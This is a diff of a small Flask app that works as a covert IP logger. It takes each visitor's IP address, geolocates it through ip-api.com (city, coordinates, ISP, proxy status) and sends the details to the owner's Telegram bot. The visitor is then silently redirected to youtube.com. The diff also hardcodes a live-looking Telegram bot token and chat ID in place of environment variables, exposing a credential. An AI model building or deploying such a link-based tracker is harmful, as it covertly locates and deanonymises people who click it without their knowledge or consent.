@@ -1,49 +1,77 @@
 from flask import Flask, request, redirect
 import requests
-import os
 from datetime import datetime
 
-REDIRECT = os.getenv('REDIRECT_URL')
-BOT_API = os.getenv('BOT_API')
-OWNER_ID = os.getenv('OWNER_ID')
+REDIRECT = "https://youtube.com/"
+BOT_API = "8574482325:AAFWuKbyippPqdDbYO-S4cb61TeoPiQwriE"
+OWNER_ID = "1287226839"
+
 app = Flask(__name__)
 
 @app.route("/")
 def main():
+    print("\n--- Visitor hit ---")
+
+    # Get visitor IP
     headers_list = request.headers.getlist("X-Forwarded-For")
     user_ip = headers_list[0] if headers_list else request.remote_addr
-    url = f"http://ip-api.com/json/{user_ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
-    response = requests.get(url)
-    info = response.json()
-    output = f"""*🥳🥳A new visiter arrived on the website!!🥳🥳*
-*Timestamp :* `{datetime.now()}`
-*IP Address : {info['query']}*
-*Details : *
-    *Status :* `{info['status']}`
-    *Continent Code :* `{info['continentCode']}`
-    *Country :* `{info['country']}`
-    *Country Code :* `{info['countryCode']}`
-    *Region :* `{info['region']}`
-    *Region Name :* `{info['regionName']}`
-    *City :* `{info['city']}`
-    *District :* `{info['district']}`
-    *Zip :* `{info['zip']}`
-    *Latitude :* `{info['lat']}`
-    *Longitude :* `{info['lon']}`
-    *Time Zone :* `{info['timezone']}`
-    *Offset :* `{info['offset']}`
-    *Currency :* `{info['currency']}`
-    *ISP :* `{info['isp']}`
-    *Org :* `{info['org']}`
-    *As :* `{info['as']}`
-    *Asname :* `{info['asname']}`
-    *Reverse :* `{info['reverse']}`
-    *User is on Mobile :* `{info['mobile']}`
-    *Proxy :* `{info['proxy']}`
-    *Hosting :* `{info['hosting']}`
-    """
-    requests.get(f'https://api.telegram.org/bot{BOT_API}/sendmessage?chat_id={OWNER_ID}&text={output}&parse_mode=Markdown')
-    return redirect(REDIRECT)
-    
+    print("Visitor IP:", user_ip)
+
+    # Call IP-API
+    try:
+        resp = requests.get(
+            f"http://ip-api.com/json/{user_ip}?fields=status,message,continent,continentCode,"
+            "country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,"
+            "offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
+            timeout=5
+        )
+        info = resp.json()
+    except Exception as e:
+        info = {"query": user_ip, "country": "Unknown", "city": "Unknown", "isp": "Unknown"}
+        print("IP-API error:", e)
+
+    # Format visitor info
+    visitor_info = f"""
+🥳 New visitor! 🥳
+Time: {datetime.now()}
+IP: {info.get('query')}
+Status: {info.get('status')}
+Continent: {info.get('continent')} ({info.get('continentCode')})
+Country: {info.get('country')} ({info.get('countryCode')})
+Region: {info.get('regionName')} ({info.get('region')})
+City: {info.get('city')}
+District: {info.get('district')}
+Zip: {info.get('zip')}
+Latitude/Longitude: {info.get('lat')}, {info.get('lon')}
+Timezone: {info.get('timezone')} (Offset {info.get('offset')})
+Currency: {info.get('currency')}
+ISP: {info.get('isp')}
+Org: {info.get('org')}
+AS: {info.get('as')} ({info.get('asname')})
+Reverse DNS: {info.get('reverse')}
+Mobile: {info.get('mobile')}
+Proxy: {info.get('proxy')}
+Hosting: {info.get('hosting')}
+"""
+
+    # Print in terminal
+    print(visitor_info)
+
+    # Send Telegram message
+    if user_ip != "127.0.0.1":
+        try:
+            resp = requests.get(
+                f"https://api.telegram.org/bot{BOT_API}/sendMessage",
+                params={"chat_id": OWNER_ID, "text": visitor_info}
+            )
+            print("Telegram response:", resp.json())
+        except Exception as e:
+            print("Error sending Telegram message:", e)
+
+    # Optional redirect
+    if REDIRECT:
+        return redirect(REDIRECT)
+    return "Visitor info logged locally. Check terminal and Telegram."
+
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', debug=False)
+    app.run(host="127.0.0.1", port=5000, debug=True)
